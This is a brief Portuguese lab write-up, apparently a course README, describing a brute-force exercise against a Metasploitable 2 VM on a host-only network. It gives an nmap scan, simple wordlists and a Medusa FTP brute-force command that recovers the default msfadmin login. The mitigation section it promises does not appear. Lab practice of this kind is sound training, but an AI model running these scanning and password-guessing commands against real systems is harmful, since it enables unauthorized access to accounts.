# Brute-force-Santander
Teste simples do uso Medusa
## Objetivo
Simular ataques de força bruta em ambiente controlado (Kali Linux atacante e Metasploitable 2 alvo) usando Medusa. Documentar procedimento, resultados e recomendações de mitigação.

## Ambiente
- VirtualBox
- Kali Linux (atacante)
- Metasploitable 2 (alvo)
- Rede: Host-Only

## Reconhecimento
Comando usado: `nmap -sV -p 21,22,80,139,445 192.168.56.101 -oN nmap_scan_192.168.56.101.txt`

Resultado relevante: FTP identificado como vsFTPd 2.3.4

Verificação do serviço FTP

Comando: `ftp 192.168.56.101`
Confirmação: serviço responde a conexões.

Wordlists usadas

Criar listas simples:

printf "msfadmin\nadmin\nroot\n" > users.txt
printf "123456\npassword\nqwerty\nmsfadmin\n" > pass.txt

Execução do ataque

Comando Medusa: `medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -f`

Resultado: credenciais válidas encontradas: msfadmin:msfadmin.


## 

Simples e direto ;)


